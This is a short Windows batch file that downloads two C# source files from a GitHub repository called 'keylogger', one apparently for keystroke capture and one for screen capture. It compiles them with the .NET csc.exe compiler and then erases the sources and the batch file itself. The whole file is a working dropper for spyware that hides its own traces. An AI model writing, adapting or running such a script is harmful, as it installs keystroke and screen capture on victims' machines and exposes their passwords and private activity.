@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/keycap.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe keycap.cs
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/winscr.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe winscr.cs
erase keycap.cs & erase winscr.cs & erase f.bat
